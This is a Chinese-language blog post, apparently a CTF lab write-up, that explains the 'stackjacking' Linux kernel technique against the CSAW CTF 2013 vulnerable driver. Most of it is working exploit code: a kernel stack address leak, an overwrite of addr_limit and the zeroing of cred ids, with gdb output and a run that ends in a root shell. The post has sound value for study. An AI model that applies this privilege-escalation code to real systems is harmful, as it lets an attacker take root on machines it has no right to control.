---
title: WTF is Stackjacking?
date: 2017-08-27 16:03:53
tags:
- kernel memory leaking
- stackjacking
categories:
- kernel_exploit
---

stackjacking这个技术确实很好用，可以绕过很多内核防御措施，例如SMEP/SMAP，还有KADR(Kernel Address Display Restriction)，当然KASLR也可以绕过。所以说很是值得研究一下~
我真的是年轻，一开始就用kernel 4.10.17的来做试验，结果内核有些结构体都变化了，和我看的差距有点大，当然也不是不行，只不过多花些时间慢慢自己看源码罢了。后来我还是换到了ubuntu 12.04.5~为了方便调试，我还特地花几个小时又重新编译了一下内核。
<!-- more -->
## Env
```
w0lfzhang@w0lfzhang-666:~/Desktop$ uname -a
Linux w0lfzhang-666 3.13.1 #1 SMP Fri Sep 1 19:50:02 CST 2017 x86_64 x86_64 x86_64 GNU/Linux
w0lfzhang@w0lfzhang-666:~/Desktop$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 12.04.5 LTS
Release:	12.04
Codename:	precise
```
还有SMEP/SMAP，KADR都是开了的:
```
w0lfzhang@w0lfzhang-666:~$ cat /proc/cpuinfo | grep "smep \| smap" 
flags		: ......smep bmi2 invpcid rtm rdseed adx smap ......
w0lfzhang@w0lfzhang666:~$ cat /proc/kallsyms | grep commit_creds
0000000000000000 T commit_creds
0000000000000000 r __ksymtab_commit_creds
0000000000000000 r __kstrtab_commit_creds
```
ubuntu 12.04.5默认是没有开启KASLR的，但是KASLR对这个实验没有影响，所以自然而然也就可以绕过KASLR了。

## Stackjacking
stackjacking这个技术利用条件也并非很苛刻，只需要满足以下两个条件即可：
1. an arbitrary kernel write;
2. a kernel stack memory leaking

这个利用技巧总的来说可分为三大步：
1. Stack leaking，简单地说就是泄露一个栈地址，然后算出kernel stack的基地址，kstack_base = leaked_addr & ~(THREAD_SIZE-1)，THREAD_SIZE在x86上是4K或8K，在x86_64是总是8K，也就是0x2000。
2. Stack groping，这一步我们的目的是得到一个内核任意读的机会，这就需要我们在内核任意写和stack leaking上做文章。Jon Oberheide在他的博客上说了两种方法，但我现在只试验了第一种方法：overwrite addr_limit in [thread_info](http://elixir.free-electrons.com/linux/v3.13.1/source/arch/x86/include/asm/thread_info.h)。至于addr_limit是干什么用的，可参考这篇[文章](https://xorl.wordpress.com/2010/10/25/linux-kernel-user-to-kernel-space-range-checks/)。一般来说我们在用户空间访问内核空间是不允许的，可是当我们把这个值覆盖为ULONG_MAX后，我们可以任意地访问内核空间。第二种方法目前还没遇到过。
3. Stack jacking，上一步我们可以在内核空间任意读取数据，这一步只需读取real_cred的地址，利用内核任意写的漏洞把real_cred和cred的相关id字段overwrite为0即可达到escalate privileges的目的。

## Demo to Exploit
我用的例子是[CSAW CTF 2013 Kernel Exploitation Challenge](https://poppopret.org/2013/11/20/csaw-ctf-2013-kernel-exploitation-challenge/#exploit)，但是因为某些原因无法泄露我的64位系统上的栈地址，所以我做了点修改：
```c
- #define DRIVER_VERSION "CSAW SUCKiT v1.3.37"
+ #define DRIVER_VERSION "AAAAAAA"

struct csaw_stats {
    unsigned long clients;
    unsigned long handles;
    unsigned long bytes_read;
    unsigned long bytes_written;
    - char version[40];
    + char version[136];
};
```
例子本来有stack leaking和arbitrary write的漏洞，符合我们stackjacking的利用条件。接下来我会用stackjacking来得到root权限。

首先我们来泄露栈的地址，可以利用iotcl函数的CSAW_GET_STATS命令。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/uio.h>
#include <sys/utsname.h>

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_GET_STATS      CSAW_IOCTL_BASE+7

struct csaw_stats {
    unsigned long clients;
    unsigned long handles;
    unsigned long bytes_read;
    unsigned long bytes_written;
    char version[136];
};

int main ( int argc, char **argv )
{
    int fd, ret, i;
    struct csaw_stats csaw_stats;

    fd = open("/dev/csaw", O_RDONLY);
    if ( fd < 0 )
    {
        perror("open");
        exit(EXIT_FAILURE);
    }

    memset(&csaw_stats, 0, sizeof(csaw_stats));

    ret = ioctl(fd, CSAW_GET_STATS, &csaw_stats);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    for ( i = 0; i < 64*2; i++ )
        printf("%02hhx ", csaw_stats.version[8+i]);
    printf("\n");

    return 0;
}
```
看下执行结果：
```
w0lfzhang@w0lfzhang-666:~/Desktop/Brad-Oberberg/solution$ ./leak
30 0b 47 05 1a 7f 00 00 18 ff ce 77 00 88 ff ff 98 54 73 81 ff ff ff ff 58 fe ce 77 00 88 ff ff 86 00 00 00 00 00 00 00 68 fe ce 77 00 88 ff ff 86 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 fe ce 77 00 88 ff ff d0 c7 73 7a 00 88 ff ff 31 01 00 00 00 00 00 00 40 a6 74 78 00 88 ff ff 78 fe ce 77 00 88 ff ff ec 3d 11 81 ff ff ff ff a8 fe ce 77 00 88 ff ff 
```
可以看到里面泄露了很多stack的地址，(0xffff880000000000-0xffff8800c0000000)，我们可以随便取一个，然后计算得到thread_info的地址：
```
gdb-peda$ x/2gx $rsp
0xffff880078941ea0:	0xffffffff811d4ea6	0xffff880078941ec8
gdb-peda$ p/x 0xffff880078941ea0 & ~0x1fff
$1 = 0xffff880078940000
gdb-peda$ x/2gx 0xffff880078940000
0xffff880078940000:	0xffff88002d9e97f0	0xffffffff81c39320
gdb-peda$ p (struct thread_info)*0xffff880078940000
$2 = {
  task = 0xffff88002d9e97f0, 
  exec_domain = 0xffffffff81c39320 <default_exec_domain>, 
  flags = 0x80000, 
  status = 0x0, 
  cpu = 0x0, 
  saved_preempt_count = 0x80200000, 
  addr_limit = {
    seg = 0xffffffffffffffff
  }, 
  restart_block = {
    fn = 0xffffffff8107c0b0 <do_no_restart_syscall>, 
    {
      futex = {
        uaddr = 0x14ceb30, 
        val = 0x5, 
        flags = 0x1, 
        bitset = 0x49, 
        time = 0x23c4af7d, 
        uaddr2 = 0x0 <irq_stack_union>
      }, 
      nanosleep = {
        clockid = 0x14ceb30, 
        rmtp = 0x100000005, 
        compat_rmtp = 0x49 <irq_stack_union+73>, 
        expires = 0x23c4af7d
      }, 
      poll = {
        ufds = 0x14ceb30, 
        nfds = 0x5, 
        has_timeout = 0x1, 
        tv_sec = 0x49, 
        tv_nsec = 0x23c4af7d
      }
    }
  }, 
  sysenter_return = 0x0 <irq_stack_union>, 
  sig_on_uaccess_error = 0x0, 
  uaccess_err = 0x0
}
gdb-peda$ p &default_exec_domain 
$3 = (struct exec_domain *) 0xffffffff81c39320 <default_exec_domain>
```
泄露栈地址后，接下来就是overwrite addr_limit了，这个步骤也不难，可参考上述提到的文章：
```c
    puts("[*] allocating a handle.....\n");
    memset(&alloc_args, 0, sizeof(alloc_args));
    alloc_args.size = BUF_SIZE;

    ret = ioctl(fd, CSAW_ALLOC_HANDLE, &alloc_args);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    handle = alloc_args.handle;
    printf("[+] Acquired handle: %lx\n", handle);

    puts("[*] Leaking buf's address......\n");
    memset(&consumer_args, 0, sizeof(consumer_args));
    consumer_args.handle = handle;
    consumer_args.offset = 255;

    ret = ioctl(fd, CSAW_GET_CONSUMER, &consumer_args);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    buf = consumer_args.pid;
    printf("[+] buf = %p\n", (void *)buf);

    seed = buf ^ handle;
    printf("[+] seed = %lx\n", seed);

    target = (unsigned long)addr_limit;
    printf("[+] target(addr_limit) = %lx\n", target);
    new_handle = target ^ seed;
    printf("[+] new handle = %lx\n", new_handle);

    puts("[*] overwriting buf as addr_limit's address......");
    memset(&consumer_args, 0, sizeof(consumer_args));
    consumer_args.handle = handle;
    consumer_args.offset = 255;
    consumer_args.pid = target;

    ret = ioctl(fd, CSAW_SET_CONSUMER, &consumer_args);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    puts("[*] overwriting addr_limit as 0xffffffffffffffff......");
    buf = (unsigned long)-1;
    memset(&write_args, 0, sizeof(write_args));
    write_args.handle = new_handle;
    write_args.size = sizeof(buf);
    write_args.in = &buf;

    ret = ioctl(fd, CSAW_WRITE_HANDLE, &write_args);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    close(fd);
```
然后是最蛋疼的步骤，找real_cred的地址。刚开始用搜索的方法read总是阻塞，不知道是什么原因，耽搁了好长时间。后来没有办法了，只能算出task_struct和real_cred的偏移了。因为我们很容易得到task_struct的地址，然后只需要加上(减去)偏移就可得到real_cred的地址了。只需要写个小小的LKM就可以了。
```c
static int __init lezzdoit ( void )
{
    printk(KERN_INFO "The current process's creds: %lx %lx %lx\n", current, &current->real_cred, &current->cred);
    return 0;
}

static void __exit wereouttahurr ( void )
{
    printk(KERN_INFO "remove\n");
}

module_init(lezzdoit);
module_exit(wereouttahurr);

MODULE_LICENSE("GPL");
```
dmesg查看下输出：
```
[   67.735123] The cuurent process the cred: ffff88002d3c47d0 ffff88002d3c4c68 ffff88002d3c4c70
```
算出task_struct与real_cred偏移：0xffff88002d3c4c68 - 0xffff88002d3c47d0。然后可以验证一下找到的地址是否正确：
```c
    unsigned long offset = 0xffff88007a74b478 - 0xffff88007a74afe0;
    real_cred = task_struct + offset;
    printf("[+] task_struct->real_cred's address: %p\n", real_cred);
    cred = real_cred + sizeof(void *);
    printf("[+] task_struct->cred's address): %p\n", cred );
    //now real_cred is pointing to the cred struct
    kmemcpy(&real_cred, real_cred, sizeof(void *));
    kmemcpy(&uid, real_cred + sizeof(unsigned int), sizeof(unsigned int));
    if( getuid() == uid )
    {
        puts("fucking the world! finally got it!\n");
    }
```
最后把real_cred和cred结构体里面的id字段改为0即可。
```c
    puts("[*] Starting overwriting real_cred and cred....");
    unsigned int zeroarray[8];
    memset(zeroarray, 0, 32);
    kmemcpy(real_cred + 4, zeroarray, sizeof(zeroarray));

    kmemcpy(&uid, real_cred + sizeof(unsigned int), sizeof(unsigned int));
    printf("[+] task_struct->real_cred->uid: %d\n", uid);

    puts("[*] overwriting task_struct->cred to the same address as real_cred");
    kmemcpy(cred, &real_cred, sizeof(void *));

    kmemcpy(&cred, cred, sizeof(void *));
```
执行exp后我们拿到了可爱的root shell:
```c
w0lfzhang@w0lfzhang-666:~/Desktop/Brad-Oberberg$ gcc -o exp stackjacking.c
w0lfzhang@w0lfzhang-666:~/Desktop/Brad-Oberberg$ ./exp
[*] leaking kernel stack address......

[+] Leaked stack address: ffff880079361f18
[+] kernel stack base address: 0xffff880079360000
[*] allocating a handle.....

[+] Acquired handle: 24c7478d5e0afd1c
[*] Leaking buf's address......

[+] buf = 0xffff880077c68000
[+] seed = db38cf8d29cc7d1c
[+] target(addr_limit) = ffff880079360020
[+] new handle = 24c7478d50fa7d3c
[*] overwriting buf as addr_limit's address......
[*] overwriting addr_limit as 0xffffffffffffffff......
[*] Creating a pipe to read task_struct's data.....
[+] task_struct: 0xffff8800788197f0
[*] Seeking task_struct->real_cred......
[+] uid: 1000
[+] task_struct->real_cred's address: 0xffff880078819c88
[+] task_struct->cred's address): 0xffff880078819c90
fucking the world! finally got it!

[*] Starting overwriting real_cred and cred....
[+] task_struct->real_cred->uid: 0
[*] overwriting task_struct->cred to the same address as real_cred
[+] task_struct->cred = 0xffff880077ca2fc0
[+] getuid() = 0
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(w0lfzhang)
```
[exp及例子源码](https://github.com/w0lfzhang/kernel_exploit/tree/master/stackjacking)

## Links
[Stackjacking Your Way to grsec/PaX Bypass](https://jon.oberheide.org/blog/2011/04/20/stackjacking-your-way-to-grsec-pax-bypass/)
[LinuxカーネルモジュールでStackjackingによるSMEP+SMAP+KADR回避をやってみる](http://inaz2.hatenablog.com/entry/2015/03/27/021422)